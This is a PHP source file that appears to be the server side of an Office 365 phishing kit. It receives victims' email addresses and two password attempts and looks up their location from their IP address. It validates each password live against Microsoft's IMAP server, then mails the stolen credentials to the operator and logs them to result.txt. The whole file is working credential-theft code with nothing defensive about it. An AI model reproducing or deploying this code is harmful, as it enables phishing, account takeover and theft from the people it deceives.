<?php
error_reporting(0);

session_start();

header('Access-Control-Allow-Origin: *');

require_once 'mail.php';

if (isset($_GET['domain'])) {

	$mail = base64_decode($_GET['domain']);
	$regexp = "/^(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){255,})(?!(?:(?:\\x22?\\x5C[\\x00-\\x7E]\\x22?)|(?:\\x22?[^\\x5C\\x22]\\x22?)){65,}@)(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22))(?:\\.(?:(?:[\\x21\\x23-\\x27\\x2A\\x2B\\x2D\\x2F-\\x39\\x3D\\x3F\\x5E-\\x7E]+)|(?:\\x22(?:[\\x01-\\x08\\x0B\\x0C\\x0E-\\x1F\\x21\\x23-\\x5B\\x5D-\\x7F]|(?:\\x5C[\\x00-\\x7F]))*\\x22)))*@(?:(?:(?!.*[^.]{64,})(?:(?:(?:xn--)?[a-z0-9]+(?:-+[a-z0-9]+)*\\.){1,126}){1,}(?:(?:[a-z][a-z0-9]*)|(?:(?:xn--)[a-z0-9]+))(?:-+[a-z0-9]+)*)|(?:\\[(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){7})|(?:(?!(?:.*[a-f0-9][:\\]]){7,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,5})?)))|(?:(?:IPv6:(?:(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){5}:)|(?:(?!(?:.*[a-f0-9]:){5,})(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3})?::(?:[a-f0-9]{1,4}(?::[a-f0-9]{1,4}){0,3}:)?)))?(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))(?:\\.(?:(?:25[0-5])|(?:2[0-4][0-9])|(?:1[0-9]{2})|(?:[1-9]?[0-9]))){3}))\\]))$/iD";
	if (!preg_match ($regexp, $mail)){
		exit('error');
	}

	list ($user, $domain) = explode ("@", $mail);
	if (!checkdnsrr($domain, 'MX')){
		exit('false');
	}else{
		exit('true');
	}

}elseif(isset($_POST['email'])){
	$ip = getenv("REMOTE_ADDR");
	$_SESSION['user'] = $user = $_POST['email'];
	$pass1 = $_POST['pass1'];
	$pass2 = $_POST['pass2'];

	$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
	if(property_exists($ipdat, 'geoplugin_countryCode')){ $countrycode = $ipdat->geoplugin_countryCode; }else{ $countrycode = ''; }
	if(property_exists($ipdat, 'geoplugin_countryName')){ $country = $ipdat->geoplugin_countryName; }else{ $country = ''; }
	if(property_exists($ipdat, 'geoplugin_city')){ $city = $ipdat->geoplugin_city; }else{ $city = ''; }
	if(property_exists($ipdat, 'geoplugin_region')){ $region = $ipdat->geoplugin_region; }else{ $region = ''; }
	
	if(!empty($pass1) && !empty($user)) {
		$checker = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $user, $pass1);
		if($checker){
			$msg = "
			Valid Office
			++++++++++++++++++++++++++++++++++++++++
			Email: {$user}
			Password: {$pass1}
			IP: {$ip}
			Country: {$country} - {$countrycode}
			City: {$city}
			Region: {$region}
			";

			@mail($to, "Valid+0FF!C3 - $ip - $country", $msg);
			
		} else {
		
			$msg = "
			InValid Office
			----------------------------------------
			Email: {$user}
			Password: {$pass1}
			IP: {$ip}
			Country: {$country} - {$countrycode}
			City: {$city}
			Region: {$region}
			";

			@mail($to, "InValid-0FF!C3 - $ip - $country", $msg);
		
		}
	}
	
	if(!empty($pass2) && !empty($user)) {
		$checker = @imap_open("{outlook.office365.com:993/imap/ssl}INBOX", $user, $pass2);
		if($checker){
			$msg = "
			Valid Office
			++++++++++++++++++++++++++++++++++++++++
			Email: {$user}
			Password: {$pass2}
			IP: {$ip}
			Country: {$country} - {$countrycode}
			City: {$city}
			Region: {$region}
			";

			@mail($to, "Valid+0FF!C3 - $ip - $country", $msg);
			
		} else {
		
			$msg = "
			InValid Office
			----------------------------------------
			Email: {$user}
			Password: {$pass2}
			IP: {$ip}
			Country: {$country} - {$countrycode}
			City: {$city}
			Region: {$region}
			";

			@mail($to, "InValid-0FF!C3 - $ip - $country", $msg);
		
		}
	}	
	$handler=fopen('result.txt','a');
	fwrite($handler,$msg."================================\n");
	fclose($handler);
	exit('sent');
}



?>